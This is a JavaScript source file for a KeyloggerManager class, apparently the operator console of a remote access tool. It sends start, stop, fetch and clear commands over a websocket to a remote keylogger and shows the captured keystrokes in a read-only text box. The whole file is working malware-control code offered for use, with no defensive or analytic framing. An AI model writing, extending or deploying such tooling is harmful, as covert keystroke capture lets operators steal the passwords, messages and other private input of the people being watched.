export class KeyloggerManager {
    constructor(ws, logger) {
        this.ws = ws;
        this.logger = logger;
        this.textarea = document.getElementById('txtKeylogs');
        
        this.setupListeners();
    }

    setupListeners() {
        document.getElementById('btn-keylog-start').addEventListener('click', () => {
            this.start();
        });

        document.getElementById('btn-keylog-stop').addEventListener('click', () => {
            this.stop();
        });

        document.getElementById('btn-keylog-get').addEventListener('click', () => {
            this.getData();
        });

        document.getElementById('btn-keylog-clear').addEventListener('click', () => {
            this.clear();
        });

        // Prevent typing in textarea
        this.textarea.addEventListener('keydown', (e) => {
            e.preventDefault();
        });

        this.ws.on('keylog_data', (data) => {
            this.textarea.value = data.data;
            this.textarea.scrollTop = this.textarea.scrollHeight;
            this.logger.log("> Keylogs updated.");
        });
    }

    start() {
        this.ws.send('keylog_start');
    }

    stop() {
        this.ws.send('keylog_stop');
    }

    getData() {
        this.ws.send('keylog_get');
    }

    clear() {
        this.ws.send('keylog_clear');
    }
}